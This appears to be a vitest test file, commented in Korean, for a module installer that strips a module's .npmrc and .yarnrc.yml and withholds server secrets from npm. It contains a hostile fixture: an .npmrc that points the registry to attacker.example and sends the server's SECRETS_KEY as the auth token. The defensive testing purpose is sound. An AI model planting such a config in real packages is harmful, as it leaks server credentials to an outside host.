import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { parseConfig } from '../src/config/env.ts';
import { buildReport, npmInvocation, type InstallContext } from '../src/modules/install.ts';
import { parseManifest } from '../src/modules/manifest.ts';

// Git · zip 모듈 설치 점검: 외부 패키지(npm install)는 다른 점검을 모두 통과했을 때만 맨 마지막에,
// 서버의 비밀값 없이 · 모듈에 딸린 .npmrc 없이 · 지정한 레지스트리로만 받습니다.
// 가짜 npm 을 PATH 맨 앞에 두어 실제로 실행되는 길(execFile)을 그대로 거칩니다.

const repoRoot = path.resolve(import.meta.dirname, '..', '..');
const KEY32 = Buffer.alloc(32, 1).toString('base64');
const REGISTRY = 'https://registry.example.test';
/** 서버 환경 변수에 있어도 npm 에 넘어가면 안 되는 값 */
const SECRETS = { SECRETS_KEY: 'server-secrets-key-must-not-leak', ADMIN_PASSWORD: 'admin-password-must-not-leak', ANTHROPIC_API_KEY: 'sk-ant-api03-must-not-leak', SB_TEST_SECRET: 'other-secret-must-not-leak' };

let root: string;
let seen: string;
let dataDir: string;
let ctx: InstallContext;
const saved: Record<string, string | undefined> = {};

beforeAll(() => {
  root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'sb-npm-')));
  seen = path.join(root, 'npm-seen.txt');
  dataDir = path.join(root, 'data');
  fs.mkdirSync(path.join(root, 'bin'));
  // 가짜 npm: 받은 인자 · 작업 폴더의 .npmrc 유무 · 환경 변수를 적고, 패키지 하나를 node_modules 에 만듭니다.
  fs.writeFileSync(
    path.join(root, 'bin', 'npm'),
    [
      '#!/bin/sh',
      '{',
      '  echo "ARGS:$*"',
      '  if [ -f .npmrc ]; then echo "NPMRC:present"; else echo "NPMRC:absent"; fi',
      '  env',
      `} > '${seen}'`,
      'mkdir -p node_modules/left-pad',
      `printf '{"name":"left-pad","version":"1.3.0","license":"MIT"}' > node_modules/left-pad/package.json`,
      '',
    ].join('\n'),
    { mode: 0o755 },
  );
  const config = parseConfig({ ADMIN_PASSWORD: 'x'.repeat(12), SESSION_SECRET: 's'.repeat(32), SECRETS_KEY: KEY32, DATA_DIR: dataDir, MODULE_NPM_REGISTRY: REGISTRY }, repoRoot);
  ctx = { config, toolOwners: () => new Map(), moduleExists: () => null, envHas: () => true };
});
afterAll(() => {
  fs.rmSync(root, { recursive: true, force: true });
});

beforeEach(() => {
  for (const k of ['PATH', ...Object.keys(SECRETS)]) saved[k] = process.env[k];
  process.env['PATH'] = `${path.join(root, 'bin')}:${saved['PATH'] ?? ''}`;
  Object.assign(process.env, SECRETS);
  fs.rmSync(seen, { force: true });
});
afterEach(() => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
});

/** 빈 모듈 템플릿에 외부 패키지 · 파일을 더한 모듈 폴더 */
function moduleDir(extra: Record<string, string> = {}): string {
  const dir = fs.mkdtempSync(path.join(root, 'mod-'));
  fs.cpSync(path.join(repoRoot, 'templates', 'blank'), dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'LICENSE'), fs.readFileSync(path.join(repoRoot, 'LICENSE'), 'utf8'));
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'evil-mod', version: '1.0.0', license: 'MIT', type: 'module', dependencies: { 'left-pad': '^1.3.0' } }));
  for (const [name, content] of Object.entries(extra)) fs.writeFileSync(path.join(dir, name), content);
  return dir;
}
const manifestOf = (dir: string) => parseManifest(JSON.parse(fs.readFileSync(path.join(dir, 'module.json'), 'utf8')), 'test');
const EVIL_NPMRC = 'registry=https://attacker.example/\n//attacker.example/:_authToken=${SECRETS_KEY}\n';

describe('설치 점검의 외부 패키지 받기', () => {
  it('npm 은 서버 비밀값 없이, 모듈의 .npmrc 를 지운 뒤, 지정한 레지스트리로만 돕니다', async () => {
    const dir = moduleDir({ '.npmrc': EVIL_NPMRC, '.yarnrc.yml': 'npmRegistryServer: "https://attacker.example"\n' });
    const report = await buildReport(dir, manifestOf(dir), 'zip', 'evil.zip', null, ctx, { allowDependencies: true });

    const out = fs.readFileSync(seen, 'utf8');
    expect(out).toContain('NPMRC:absent');
    for (const v of Object.values(SECRETS)) expect(out).not.toContain(v);
    const args = out.split('\n').find((l) => l.startsWith('ARGS:')) ?? '';
    expect(args).toContain('install --omit=dev --ignore-scripts --no-audit --no-fund --no-package-lock');
    expect(args).toContain(`--registry=${REGISTRY}`);
    expect(args).toMatch(new RegExp(`--userconfig=${dataDir}/tmp/npm-[^ ]+/\\.npmrc`));
    // 홈 · 캐시는 이 점검만의 빈 폴더 (서버 계정의 ~/.npmrc 를 읽지 않음)
    const env = Object.fromEntries(out.split('\n').filter((l) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(l)).map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]));
    expect(env['HOME']).toMatch(new RegExp(`^${dataDir}/tmp/npm-`));
    expect(env['HOME']).not.toBe(os.homedir());
    expect(env['npm_config_cache']).toBe(`${env['HOME']}/cache`);
    const allowed = new Set(['PATH', 'LANG', 'HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY', 'http_proxy', 'https_proxy', 'no_proxy', 'NODE_EXTRA_CA_CERTS', 'HOME', 'TMPDIR', 'npm_config_cache', 'npm_config_update_notifier']);
    const byShell = new Set(['PWD', 'OLDPWD', 'SHLVL', '_', '__CF_USER_TEXT_ENCODING']);
    expect(Object.keys(env).filter((k) => !allowed.has(k) && !byShell.has(k))).toEqual([]);

    expect(fs.existsSync(path.join(dir, '.npmrc'))).toBe(false);
    expect(fs.existsSync(path.join(dir, '.yarnrc.yml'))).toBe(false);
    expect(report.checks.find((c) => c.label === '패키지 설정 파일')).toEqual({
      label: '패키지 설정 파일',
      level: 'warn',
      detail: `.npmrc, .yarnrc.yml 을(를) 지웠습니다. 레지스트리나 인증 정보를 바꿀 수 있는 파일이라 쓰지 않고, 외부 패키지는 ${REGISTRY} 에서만 받습니다.`,
    });
    expect(report.checks.find((c) => c.label === '의존성 라이선스')).toMatchObject({ level: 'ok', detail: '1개 모두 허용형 · MIT 1' });
    // 외부 패키지 받기는 맨 마지막 점검이고, 쓰고 난 임시 홈은 지웁니다.
    expect(report.checks.at(-1)?.label).toBe('의존성 라이선스');
    expect(fs.readdirSync(path.join(dataDir, 'tmp')).filter((n) => n.startsWith('npm-'))).toEqual([]);
  });

  it('앞의 점검에서 막히면(정적 검사 · 도구 이름 충돌) npm 을 아예 돌리지 않습니다', async () => {
    const evalDir = moduleDir({ '.npmrc': EVIL_NPMRC });
    fs.appendFileSync(path.join(evalDir, 'index.js'), "\nexport const x = eval('1 + 1');\n");
    const r1 = await buildReport(evalDir, manifestOf(evalDir), 'zip', 'evil.zip', null, ctx, { allowDependencies: true });
    expect(r1.checks.some((c) => c.level === 'error')).toBe(true);
    expect(r1.checks.at(-1)).toEqual({ label: '의존성 라이선스', level: 'warn', detail: '앞의 문제 때문에 외부 패키지 1개(left-pad)를 내려받지 않았습니다. 문제를 고친 뒤 다시 점검하세요.' });
    expect(fs.existsSync(seen)).toBe(false);

    const clashDir = moduleDir();
    const clashCtx: InstallContext = { ...ctx, toolOwners: () => new Map([['echo', 'other-module']]) };
    const r2 = await buildReport(clashDir, manifestOf(clashDir), 'git', 'example.com/evil', 'abc1234', clashCtx, { allowDependencies: true });
    expect(r2.checks.find((c) => c.label === '도구 이름')?.level).toBe('error');
    expect(r2.checks.at(-1)?.detail).toContain('내려받지 않았습니다');
    expect(fs.existsSync(seen)).toBe(false);
  });

  it('에이전트가 만든 모듈은 예전처럼 외부 패키지를 쓸 수 없고 npm 도 돌지 않습니다', async () => {
    const dir = moduleDir();
    const report = await buildReport(dir, manifestOf(dir), 'agent', '테스트 제작', null, ctx, { allowDependencies: false });
    expect(report.checks.at(-1)).toMatchObject({ label: '의존성 라이선스', level: 'error' });
    expect(fs.existsSync(seen)).toBe(false);
  });

  it('npm 호출: 넘기는 환경 변수는 허용 목록과 이 점검만의 홈 · 캐시뿐', () => {
    process.env['HTTPS_PROXY'] = 'http://proxy.example:3128';
    try {
      const { args, env } = npmInvocation('/tmp/sb-home', REGISTRY);
      expect(args).toEqual(['install', '--omit=dev', '--ignore-scripts', '--no-audit', '--no-fund', '--no-package-lock', `--registry=${REGISTRY}`, '--userconfig=/tmp/sb-home/.npmrc']);
      expect(env).toMatchObject({ HOME: '/tmp/sb-home', TMPDIR: '/tmp/sb-home', npm_config_cache: '/tmp/sb-home/cache', npm_config_update_notifier: 'false', HTTPS_PROXY: 'http://proxy.example:3128' });
      for (const k of Object.keys(SECRETS)) expect(env).not.toHaveProperty(k);
    } finally {
      delete process.env['HTTPS_PROXY'];
    }
  });

  it('레지스트리 설정: 기본은 공식 npm, http(s) 주소만', () => {
    const base = { ADMIN_PASSWORD: 'x'.repeat(12), SESSION_SECRET: 's'.repeat(32), SECRETS_KEY: KEY32 };
    expect(parseConfig(base, repoRoot).moduleNpmRegistry).toBe('https://registry.npmjs.org');
    expect(parseConfig({ ...base, MODULE_NPM_REGISTRY: 'https://npm.internal.example/' }, repoRoot).moduleNpmRegistry).toBe('https://npm.internal.example');
    expect(() => parseConfig({ ...base, MODULE_NPM_REGISTRY: 'ftp://npm.example' }, repoRoot)).toThrow("MODULE_NPM_REGISTRY: http:// 또는 https:// 로 시작해야 합니다. 현재 프로토콜 'ftp:'");
  });
});
